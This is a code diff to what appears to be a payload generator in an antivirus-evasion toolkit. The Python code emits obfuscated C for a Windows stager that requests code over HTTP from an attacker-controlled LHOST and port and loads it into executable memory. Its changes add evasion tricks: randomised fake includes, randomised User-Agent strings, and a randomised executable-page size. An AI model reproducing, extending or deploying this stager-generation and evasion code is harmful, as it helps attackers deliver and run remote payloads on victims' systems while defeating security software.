@@ -77,10 +77,12 @@ class Payload:
         random.shuffle(stringGenFunctions)
 
         # obfuscation - add in our fake includes
-        fake_includes = ["#include <sys/timeb.h>", "#include <time.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>",
+        # Removed time.h since it is already included no need for duplicating. More OCD than functional change -Opticshade
+	# TODO: Maybe add a few more choices. If I get time I might make it pull from the list of available includes on the system. -Opticshade
+        fake_includes = ["#include <sys/timeb.h>", "#include <math.h>", "#include <signal.h>", "#include <stdarg.h>",
                         "#include <limits.h>", "#include <assert.h>"]
-        t = random.randint(1,7)
-        for x in xrange(1, random.randint(1,7)):
+        t = random.randint(1,6)
+        for x in xrange(1, random.randint(1,6)):
             includes.append(fake_includes[x])
 
         # shuffle up real/fake includes
@@ -193,13 +195,15 @@ class Payload:
         code += "for (i = 0;  i < %s;  ++i) %s[i] = malloc (%s);" %(number_of_strings_2, char_array_name_2, random.randint(max_string_length,global_max_string_length))
 
         # build and send the HTTP request to the handler
-        code += "char %s[200];" %(request_buf_name)
-        code += "sprintf(%s, \"GET /%%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: %s:%s\\r\\nConnection: close\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT\\r\\n\\r\\n\", %s());" %(request_buf_name, self.required_options["LHOST"][0], self.required_options["LPORT"][0], checksum_name)
+	# Added randomization of user agent and gave the buffer a little likely not needed padding in case we get one absurdly long. I'm too lazy right now to calc it all perfectly to the generated string's length -Opticshade
+        code += "char %s[230];" %(request_buf_name)
+        code += "sprintf(%s, \"GET /%%s HTTP/1.1\\r\\nAccept-Encoding: identity\\r\\nHost: %s:%s\\r\\nConnection: close\\r\\n%s\\r\\n\\r\\n\", %s());" %(request_buf_name, self.required_options["LHOST"][0], self.required_options["LPORT"][0], helpers.randomUserAgent(), checksum_name)
         code += "send(%s,%s, strlen( %s ),0);" %(my_socket_name, request_buf_name, request_buf_name)
         code += "Sleep(300);"
 
         # TODO: obfuscate/randomize the size of the page allocated
-        code += "%s = VirtualAlloc(0, 1000000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name)
+	# Randomized page size from 1MB to 20MB range -Opticshade
+        code += "%s = VirtualAlloc(0, %s, MEM_COMMIT, PAGE_EXECUTE_READWRITE);" %(buffer_name, random.randint(1000000, 20000000))
         code += "char* %s[%s];" % (char_array_name_3, number_of_strings_3)
 
         # first string obfuscation method
